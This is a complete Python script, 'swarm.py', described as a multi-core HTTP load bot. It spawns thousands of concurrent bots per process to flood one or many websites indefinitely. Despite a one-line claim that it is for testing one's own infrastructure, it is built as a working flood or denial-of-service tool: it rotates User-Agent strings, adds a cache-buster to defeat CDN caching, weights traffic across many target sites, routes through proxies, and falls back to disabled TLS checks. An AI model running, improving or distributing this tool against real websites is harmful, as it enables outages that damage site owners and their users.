#!/usr/bin/env python3
"""
swarm.py — Multi-core aggressive HTTP load bot (MERGED, multi-website).
For authorized load testing of your own infrastructure only.

Concept: N OS processes x per-process asyncio loop x bot slice, infinite
by default, Ctrl-C stops. Extended to hammer MANY websites at once.

MULTI-WEBSITE
  python swarm.py https://a.com https://b.com https://c.com/api
      -> every bot picks a RANDOM website per request (even load).

  python swarm.py --url-file sites.txt
      lines: one website per line, optional METHOD and WEIGHT:
        https://a.com        GET    3     # ~3x the traffic of a weight-1 site
        https://b.com/api    POST   1
        https://c.com        GET    2
      -> per-site success/status counts + a PER-WEBSITE TRAFFIC table.

FEATURES (merged from both prior builds, all working)
  correct multi-worker aggregation (snapshots tagged with worker id)
  live throughput/error line during infinite runs
  adaptive TLS (verify-on -> auto verify-off), --ipv4/--ipv6 pinning
  engine-agnostic error handling + backoff retries; --retry-5xx
  redirect-following on by default, --cache-buster (beat CDN caching)
  auth, cookies, extra headers file, --body-file / --size bodies
  proxy (--proxy http://host:port), HTTP/2 via --engine httpx --http2
  profiles (sustained / burst), --runtime / --max-reqs bounded modes
  --json export (includes per-website data)

Examples:
  python swarm.py https://A https://B --workers 4 --cache-buster --runtime 60
  python swarm.py --url-file sites.txt --engine httpx --http2 --workers 4
  python swarm.py https://A https://B --max-reqs 500000 -k --method POST -s 1024
  python swarm.py --url-file sites.txt --profile burst --workers 8 -k

Deps: pip install aiohttp ; optional: pip install "httpx[http2]" uvloop
"""

import argparse
import asyncio
import base64
import json
import multiprocessing as mp
import random
import signal
import socket
import ssl
import sys
import time
from collections import defaultdict
from contextlib import asynccontextmanager

try:
    import aiohttp
except ImportError:
    aiohttp = None
try:
    import uvloop
except ImportError:
    uvloop = None

BODY_METHODS = {"POST", "PUT", "PATCH"}

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36 Edg/125.0",
]
def random_ua():
    return random.choice(UA_POOL)

PROFILES = {
    "sustained": dict(bots=1000, delay=0.01, ramp=0.0),
    "burst":     dict(bots=3000, delay=0.0, ramp=5.0),
}

# ---------------------------------------------------------------------------
# Exception classification (engine-agnostic)
# ---------------------------------------------------------------------------
def classify(exc):
    name = type(exc).__name__
    if isinstance(exc, (asyncio.TimeoutError, TimeoutError)) or "Timeout" in name:
        return "TIMEOUT"
    if isinstance(exc, ssl.SSLError) or "SSL" in name or "Certificate" in name:
        return "SSL"
    if isinstance(exc, (ConnectionError, OSError)) or "ConnectError" in name \
       or "ConnectionError" in name or "ProtocolError" in name \
       or name.startswith("ClientConnector") or "RemoteProtocol" in name:
        return "CONN_FAIL"
    return name

def host_of(url):
    h = url.split("://", 1)[-1].split("/", 1)[0]
    return h.split(":")[0]

# ---------------------------------------------------------------------------
# Statistics (global performance + per-host counters)
# ---------------------------------------------------------------------------
class Stats:
    PCTL_SAMPLE = 20_000
    WINDOW = 5.0
    def __init__(self):
        self.total = 0
        self.ok = 0
        self.status = defaultdict(int)
        self.errors = defaultdict(int)
        self._lat = []
        self.bytes = 0
        self.http2 = 0
        self.start = time.monotonic()
        self._window = []
        self.hosts = defaultdict(lambda: defaultdict(int))  # host -> status code -> count
        self.host_tot = defaultdict(int)

    def record(self, status, lat, nbytes, major, host):
        self.total += 1
        self.status[status] += 1
        self.hosts[host][status] += 1
        self.host_tot[host] += 1
        if status < 400:
            self.ok += 1
        self._lat.append(lat)
        if len(self._lat) > self.PCTL_SAMPLE * 8:
            del self._lat[:len(self._lat) - self.PCTL_SAMPLE * 8]
        self.bytes += nbytes
        if major == 2:
            self.http2 += 1
        self._window.append(time.monotonic())

    def record_error(self, kind, host=None):
        self.total += 1
        self.errors[kind] += 1
        if host:
            self.host_tot[host] += 1
        self._window.append(time.monotonic())

    def _prune(self):
        cutoff = time.monotonic() - self.WINDOW
        w = self._window
        i = 0
        n = len(w)
        while i < n and w[i] < cutoff:
            i += 1
        if i:
            del w[:i]

    @property
    def rps_window(self):
        self._prune()
        return len(self._window) / self.WINDOW

    @property
    def error_pct(self):
        return 100.0 * sum(self.errors.values()) / max(self.total, 1)

    def _pctl(self, p):
        lat = self._lat[-self.PCTL_SAMPLE:]
        if not lat:
            return 0.0
        s = sorted(lat)
        return s[min(int(len(s) * p / 100), len(s) - 1)]

    def snapshot(self, rc=None):
        lat = self._lat[-self.PCTL_SAMPLE:]
        n = max(len(lat), 1)
        return {
            "total": self.total, "ok": self.ok, "bytes": self.bytes,
            "http2": self.http2,
            "rps_window": round(self.rps_window, 1),
            "error_pct": round(self.error_pct, 2),
            "avg_ms": round(sum(lat) / n * 1000, 2),
            "p50": round(self._pctl(50) * 1000, 2),
            "p95": round(self._pctl(95) * 1000, 2),
            "p99": round(self._pctl(99) * 1000, 2),
            "status": dict(self.status), "errors": dict(self.errors),
            "hosts": {h: dict(c) for h, c in self.hosts.items()},
            "host_tot": dict(self.host_tot),
            "rc": rc,
        }

# ---------------------------------------------------------------------------
# Engines — unified interface:  async with engine.request(method,url,headers,data) as r:
# ---------------------------------------------------------------------------
class AioEngine:
    """aiohttp: maximum raw HTTP/1.1 concurrency."""
    def __init__(self, args, targets):
        self.args, self.targets = args, targets
        self.session = None
        self.ctx = None

    def _ctx(self, verify):
        if verify:
            return ssl.create_default_context()
        c = ssl.create_default_context()
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        return c

    async def connect(self):
        a = self.args
        fam = socket.AF_INET if a.ipv4 else (socket.AF_INET6 if a.ipv6 else 0)
        timeout = aiohttp.ClientTimeout(
            total=a.timeout, connect=a.connect_timeout,
            sock_read=a.timeout, sock_connect=a.connect_timeout)
        for verify in ([False] if a.insecure else [True, False]):
            ctx = self._ctx(verify)
            conn = aiohttp.TCPConnector(
                ssl=ctx, limit=a.conn_limit or 0, limit_per_host=a.conn_limit or 0,
                ttl_dns_cache=300, enable_cleanup_closed=True,
                force_close=not a.keepalive,
                keepalive_timeout=30 if a.keepalive else 0, family=fam)
            session = aiohttp.ClientSession(connector=conn, timeout=timeout)
            got = False
            for t in self.targets:
                try:
                    async with session.get(t, ssl=ctx,
                                           allow_redirects=a.follow,
                                           proxy=a.proxy) as r:
                        await r.read()
                    got = True
                    break
                except (aiohttp.ClientConnectorCertificateError,
                        aiohttp.ClientConnectorSSLError, ssl.SSLError):
                    continue                      # cert issue -> other host / verify-off
                except (aiohttp.ClientConnectorError, asyncio.TimeoutError):
                    continue                      # host down -> try next
                except aiohttp.ClientError:
                    got = True
                    break                         # reachable (4xx/5xx) -> fine
                except Exception:
                    continue
            if got:
                self.session, self.ctx = session, ctx
                return True
            await session.close()
        return False

    @asynccontextmanager
    async def request(self, method, url, headers, data):
        a = self.args
        kw = dict(method=method, url=url, headers=headers,
                  allow_redirects=a.follow, proxy=a.proxy)
        if data:
            kw["data"] = data
        if not a.discard:
            kw["read_until_eof"] = True
        async with self.session.request(**kw) as resp:
            major = resp.version.major if resp.version else 1
            yield _Resp(major, resp.status, resp)

    async def close(self):
        if self.session:
            await self.session.close()


class HttpxEngine:
    """httpx: real HTTP/2 multiplexing when --http2 (pip install 'httpx[http2]')."""
    def __init__(self, args, targets):
        self.args, self.targets = args, targets
        self.client = None

    async def connect(self):
        try:
            import httpx
        except ImportError:
            sys.exit("[!] --engine httpx needs: pip install 'httpx[http2]'")
        a = self.args
        limits = httpx.Limits(max_connections=a.conn_limit or 20000,
                              max_keepalive_connections=a.conn_limit or 20000)
        timeout = httpx.Timeout(a.timeout, connect=a.connect_timeout,
                                read=a.timeout, write=a.timeout)
        fam = socket.AF_INET if a.ipv4 else (socket.AF_INET6 if a.ipv6 else None)
        for verify in ([False] if a.insecure else [True, False]):
            tr = httpx.AsyncHTTPTransport(verify=verify, http2=a.http2,
                                          family=fam, retries=0)
            cl = httpx.AsyncClient(transport=tr, timeout=timeout,
                                   limits=limits, follow_redirects=a.follow,
                                   proxy=a.proxy)
            got = False
            for t in self.targets:
                try:
                    await cl.get(t)
                    got = True
                    break
                except Exception:
                    continue
            if got:
                self.client = cl
                return True
            await cl.aclose()
        return False

    @asynccontextmanager
    async def request(self, method, url, headers, data):
        async with self.client.stream(method, url, headers=headers,
                                      content=data or None) as resp:
            major = 2 if resp.http_version == "HTTP/2" else 1
            yield _Resp(major, resp.status_code, resp)

    async def close(self):
        if self.client:
            await self.client.aclose()


class _Resp:
    __slots__ = ("major", "status", "raw")
    def __init__(self, major, status, raw):
        self.major, self.status, self.raw = major, status, raw
    async def iter_bytes(self, chunk=65536):
        try:
            gen = self.raw.content.iter_chunked(chunk)
        except AttributeError:
            gen = self.raw.aiter_bytes(chunk)
        async for b in gen:
            yield b

# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
class Worker:
    def __init__(self, args, q):
        self.args = args
        self.q = q
        self.stats = Stats()
        self.stop = asyncio.Event()
        self.engine = None

    def _report(self, rc=None):
        snap = self.stats.snapshot(rc)
        snap["wid"] = self.args.worker_id
        try:
            self.q.put(snap)
        except Exception:
            pass

    async def _reporter(self):
        while not self.stop.is_set():
            self._report()
            try:
                await asyncio.wait_for(self.stop.wait(), self.args.interval)
            except asyncio.TimeoutError:
                pass
        self._report()  # final flush

    async def _monitor(self):
        a = self.args
        t0 = time.monotonic()
        per = (a.max_reqs // max(a.workers, 1)) if a.max_reqs else 0
        while not self.stop.is_set():
            if a.runtime and (time.monotonic() - t0) >= a.runtime:
                self.stop.set(); break
            if per and self.stats.total >= per:
                self.stop.set(); break
            try:
                await asyncio.wait_for(self.stop.wait(), 0.2)
            except asyncio.TimeoutError:
                pass

    def _pick_target(self):
        return random.choices(self.targets,
                              weights=[t["weight"] for t in self.targets])[0]

    async def bot(self, bot_id):
        a = self.args
        eng = self.engine
        if a.ramp:
            await asyncio.sleep(random.uniform(0, a.ramp))
        n = 0
        while not self.stop.is_set():
            t = self._pick_target()
            url, host = t["url"], host_of(t["url"])
            if a.cache_buster:
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}_{random.getrandbits(24)}={random.getrandbits(32)}"

            headers = {
                "User-Agent": random_ua(),
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "X-Request-ID":
                    f"w{a.worker_id}-{bot_id}-{n}-{random.getrandbits(64):x}",
            }
            if t["method"] in BODY_METHODS:
                headers["Content-Type"] = a.content_type
            if a.auth:
                headers["Authorization"] = "Basic " + base64.b64encode(
                    a.auth.encode()).decode()
            if a.cookies:
                headers["Cookie"] = a.cookies
            headers.update(a.extra_headers)  # user overrides win
            data = a.payload if t["method"] in BODY_METHODS else None

            attempt = 0
            while True:
                t0 = time.monotonic()
                try:
                    async with eng.request(t["method"], url, headers, data) as r:
                        nb = 0
                        if not a.discard:
                            async for chunk in r.iter_bytes():
                                nb += len(chunk)
                        self.stats.record(r.status, time.monotonic() - t0,
                                          nb, r.major, host)
                        if a.retry_5xx and r.status >= 500 and attempt < a.retries:
                            self.stats.errors["RETRY_5xx"] += 1
                            attempt += 1
                            await asyncio.sleep(0.1 * attempt)
                            continue
                    break
                except Exception as e:
                    kind = classify(e)
                    self.stats.record_error(kind, host)
                    if kind not in ("CONN_FAIL", "TIMEOUT", "SSL", "RemoteProtocolError"):
                        break  # non-retryable client error
                    attempt += 1
                    if attempt > a.retries:
                        break
                    await asyncio.sleep(0.1 * attempt)  # backoff
            n += 1
            if a.delay:
                await asyncio.sleep(a.delay * random.uniform(0.5, 1.5))

    async def run(self):
        a = self.args
        urls = [t["url"] for t in self.targets]
        eng = AioEngine(a, urls) if a.engine == "aiohttp" else HttpxEngine(a, urls)
        if not await eng.connect():
            self._report(rc=-1)
            return
        self.engine = eng
        try:
            tasks = [asyncio.create_task(self.bot(i)) for i in range(a.bots)]
            tasks.append(asyncio.create_task(self._reporter()))
            tasks.append(asyncio.create_task(self._monitor()))
            await asyncio.gather(*tasks)
            self._report(rc=0)
        finally:
            await eng.close()

# ---------------------------------------------------------------------------
# Process bootstrap
# ---------------------------------------------------------------------------
def _run_child(wa, q, targets):
    try:
        if uvloop:
            try:
                uvloop.install()
            except RuntimeError:
                pass
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        w = Worker(wa, q)
        w.targets = targets
        loop.run_until_complete(w.run())
        try:
            loop.close()
        except Exception:
            pass
    except KeyboardInterrupt:
        pass
    except Exception as e:
        try:
            q.put({"fatal": str(e)})
        except Exception:
            pass

# ---------------------------------------------------------------------------
# Parent / aggregation
# ---------------------------------------------------------------------------
def _aggregate(latest):
    out = {"total": 0, "ok": 0, "bytes": 0, "http2": 0,
           "status": defaultdict(int), "errors": defaultdict(int),
           "hosts": defaultdict(lambda: defaultdict(int)),
           "host_tot": defaultdict(int)}
    for s in latest.values():
        if "total" not in s:
            continue
        out["total"] += s["total"]
        out["ok"] += s["ok"]
        out["bytes"] += s["bytes"]
        out["http2"] += s["http2"]
        for k, v in s["status"].items():
            out["status"][k] += v
        for k, v in s["errors"].items():
            out["errors"][k] += v
        for h, codes in s.get("hosts", {}).items():
            for c, v in codes.items():
                out["hosts"][h][c] += v
        for h, v in s.get("host_tot", {}).items():
            out["host_tot"][h] += v
    return out

def _live(agg, t0):
    el = max(time.monotonic() - t0, 1e-3)
    codes = " ".join(f"{k}:{v}" for k, v in sorted(agg["status"].items()))
    errs = " ".join(f"{k}:{v}" for k, v in agg["errors"].items()) or "-"
    err_pct = 100.0 * sum(agg["errors"].values()) / max(agg["total"], 1)
    sys.stdout.write(
        f"\r[{agg['total']:>12,} reqs | {agg['total']/el:>8,.0f} req/s | "
        f"h2:{agg['http2']:,} | err:{err_pct:>4.1f}% | {codes} {errs}  ")
    sys.stdout.flush()

def _print_summary(agg, a, t0):
    el = max(time.monotonic() - t0, 1e-3)
    codes = " ".join(f"{k}:{v}" for k, v in sorted(agg["status"].items()))
    errs = " ".join(f"{k}:{v}" for k, v in agg["errors"].items()) or "none"
    err_pct = 100.0 * sum(agg["errors"].values()) / max(agg["total"], 1)
    print(f"""
========== RESULTS ==========
Engine         : {a.engine}{' HTTP/2' if a.engine=='httpx' and a.http2 else ''}
Workers x bots : {a.workers} x {a.bots:,} = {a.workers * a.bots:,}
Websites       : {len(a.targets)}
Requests sent  : {agg['total']:,}  (HTTP/2: {agg['http2']:,})
Success (<400) : {agg['ok']:,} ({100 * agg['ok'] / max(agg['total'], 1):.1f}%)
Error rate     : {err_pct:.1f}%
Wall time      : {el:.1f}s
Throughput     : {agg['total']/el:,.0f} req/s avg
Data received  : {agg['bytes'] / 1e6:.1f} MB
Status codes   : {codes or 'none'}
Errors         : {errs}""")
    print("\n--- PER-WEBSITE TRAFFIC ---")
    rows = sorted(agg["host_tot"].items(), key=lambda x: -x[1])
    for host, tot in rows:
        c = agg["hosts"].get(host, {})
        okc = sum(v for k, v in c.items() if int(k) < 400)
        cs = " ".join(f"{k}:{v}" for k, v in sorted(c.items()))
        pct = 100.0 * okc / max(tot, 1)
        print(f"  {host:<32} {tot:>10,} reqs | ok {pct:>5.1f}% | {cs}")
    print("=============================")

def main():
    p = argparse.ArgumentParser(description="Multi-core aggressive multi-website load bot")
    p.add_argument("url", nargs="*",
                   help="one or more websites (https://a.com https://b.com ...)")
    p.add_argument("-P", "--profile", choices=sorted(PROFILES))
    p.add_argument("-w", "--workers", type=int, default=1,
                   help="OS processes (scale past 1 CPU core)")
    p.add_argument("-b", "--bots", type=int, default=None,
                   help="bots per worker (profile or 1000 default)")
    p.add_argument("-d", "--delay", type=float, default=None,
                   help="randomized delay between requests per bot")
    p.add_argument("-r", "--ramp", type=float, default=None,
                   help="stagger bot startup over N seconds")
    p.add_argument("-t", "--timeout", type=float, default=15)
    p.add_argument("-c", "--connect-timeout", type=float, default=6)
    p.add_argument("-m", "--method", default="GET",
                   choices=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"])
    p.add_argument("-s", "--size", type=int, default=0,
                   help="in-memory body size bytes (no file needed)")
    p.add_argument("--body-file", default=None, help="send file contents as body")
    p.add_argument("--content-type", default="application/octet-stream")
    p.add_argument("--discard", action="store_true",
                   help="skip reading response bodies (save bandwidth)")
    p.add_argument("-k", "--insecure", action="store_true",
                   help="disable TLS cert verification")
    p.add_argument("--no-keepalive", action="store_true", dest="keepalive")
    p.set_defaults(keepalive=True)
    p.add_argument("--engine", choices=["aiohttp", "httpx"], default="aiohttp")
    p.add_argument("--http2", action="store_true",
                   help="enable HTTP/2 (auto-switches engine to httpx)")
    p.add_argument("--follow", dest="follow", action="store_true", default=True)
    p.add_argument("--no-follow", dest="follow", action="store_false")
    p.add_argument("--retries", type=int, default=2,
                   help="transient connect/timeout retries per request")
    p.add_argument("--retry-5xx", action="store_true",
                   help="also retry server 5xx responses")
    p.add_argument("--conn-limit", type=int, default=0,
                   help="per-worker max concurrent connections (0=auto)")
    p.add_argument("--runtime", type=float, default=0,
                   help="seconds to run (0=infinite)")
    p.add_argument("--max-reqs", type=int, default=0,
                   help="approx total requests (0=infinite)")
    p.add_argument("--interval", type=float, default=1.0,
                   help="report interval (seconds)")
    p.add_argument("--auth", default=None, help="user:pass basic auth")
    p.add_argument("--cookies", default=None, help="k=v; k2=v2")
    p.add_argument("--ipv4", action="store_true")
    p.add_argument("--ipv6", action="store_true")
    p.add_argument("--proxy", default=None, help="http://host:port")
    p.add_argument("--cache-buster", action="store_true",
                   help="random query param per request (defeat CDN cache)")
    p.add_argument("--url-file", default=None,
                   help="file: one website per line, optional METHOD WEIGHT")
    p.add_argument("--headers", metavar="FILE",
                   help="file of extra 'Name: value' header lines")
    p.add_argument("--json", metavar="FILE", help="write metrics to JSON file")
    a = p.parse_args()

    if a.profile:
        for k, v in PROFILES[a.profile].items():
            if getattr(a, k, None) is None:
                setattr(a, k, v)
    if a.bots is None:
        a.bots = 1000
    if a.delay is None:
        a.delay = 0.0
    if a.ramp is None:
        a.ramp = 0.0

    # ---- parse multi-website targets: {url, method, weight} --------------
    def _mk(url, method=None, weight=None):
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        return {"url": url, "method": (method or a.method).upper(),
                "weight": float(weight or 1.0)}

    targets = [_mk(u) for u in a.url]
    if a.url_file:
        try:
            for raw in open(a.url_file):
                line = raw.split("#", 1)[0].strip()
                if not line:
                    continue
                parts = line.split()
                t = _mk(parts[0])
                if len(parts) > 1:
                    tok = parts[-1]
                    try:
                        t["weight"] = float(tok)
                    except ValueError:
                        if tok.upper() in BODY_METHODS | {"GET", "DELETE", "HEAD", "OPTIONS"}:
                            t["method"] = tok.upper()
                if len(parts) > 2:
                    try:
                        t["weight"] = float(parts[-1])
                    except ValueError:
                        pass
                targets.append(t)
        except OSError as e:
            sys.exit(f"[!] cannot read url file: {e}")
    if not targets:
        sys.exit("[!] provide at least one URL, or --url-file FILE")
    a.targets = targets

    # http2 -> httpx engine
    if a.http2 and a.engine != "httpx":
        print("[!] --http2 needs --engine httpx (aiohttp has no HTTP/2 "
              "client). Switching engine.", file=sys.stderr)
        a.engine = "httpx"

    # extra headers
    a.extra_headers = {}
    if a.headers:
        try:
            for raw in open(a.headers):
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    k, v = line.split(":", 1)
                    a.extra_headers[k.strip()] = v.strip()
        except OSError as e:
            sys.exit(f"[!] cannot read headers file: {e}")

    # payload
    if a.body_file:
        try:
            with open(a.body_file, "rb") as f:
                a.payload = f.read()
        except OSError as e:
            sys.exit(f"[!] cannot read body file: {e}")
    else:
        a.payload = (b"x" * a.size) if a.size else b""

    mode = "HTTP/2" if (a.http2 and a.engine == "httpx") else "HTTP/1.1"
    total_bots = a.workers * a.bots
    names = ", ".join(t["url"] for t in targets[:4])
    if len(targets) > 4:
        names += f" ... +{len(targets)-4}"
    print(f"🚀 {a.workers} worker(s) x {a.bots:,} bots ({total_bots:,} total) "
          f"-> {len(targets)} websites: {names}  [{mode}] "
          f"[{'INFINITE' if not a.runtime else f'{a.runtime}s'} — Ctrl-C]")

    ctx = mp.get_context("fork" if "fork" in mp.get_all_start_methods()
                         else "spawn")
    q = ctx.Queue()
    procs = []
    running = {"stop": False}

    def _handler(sig, frm):
        running["stop"] = True
    signal.signal(signal.SIGINT, _handler)
    signal.signal(signal.SIGTERM, _handler)

    for wid in range(a.workers):
        wa = argparse.Namespace(**vars(a))
        wa.worker_id = wid
        proc = ctx.Process(target=_run_child, args=(wa, q, targets), daemon=True)
        proc.start()
        procs.append(proc)

    latest = {}
    t0 = time.monotonic()
    fatal = False
    try:
        while not running["stop"]:
            snap = None
            try:
                snap = q.get(timeout=0.4)
            except Exception:
                pass
            if snap is not None:
                if "fatal" in snap:
                    print(f"\n[!] Worker error: {snap['fatal']}", file=sys.stderr)
                    fatal = True
                    running["stop"] = True
                    break
                if snap.get("rc") == -1:
                    print("\n[!] Worker could not reach any target.",
                          file=sys.stderr)
                    fatal = True
                    running["stop"] = True
                    break
                latest[snap.get("wid", 0)] = snap
            _live(_aggregate(latest), t0)
            if (a.runtime or a.max_reqs) and latest and \
               not any(pr.is_alive() for pr in procs):
                break
    except KeyboardInterrupt:
        running["stop"] = True

    for pr in procs:
        pr.terminate()
    for pr in procs:
        pr.join(timeout=5)
    for pr in procs:
        if pr.is_alive():
            pr.kill()

    print()
    _print_summary(_aggregate(latest), a, t0)
    if a.json:
        agg = _aggregate(latest)
        agg["elapsed"] = max(time.monotonic() - t0, 1e-3)
        agg["targets"] = [t["url"] for t in targets]
        agg = {**agg, "status": dict(agg["status"]),
               "errors": dict(agg["errors"]),
               "hosts": {h: dict(c) for h, c in agg["hosts"].items()}}
        with open(a.json, "w") as f:
            json.dump(agg, f, indent=2)
        print(f"[+] Metrics written to {a.json}")

if __name__ == "__main__":
    main()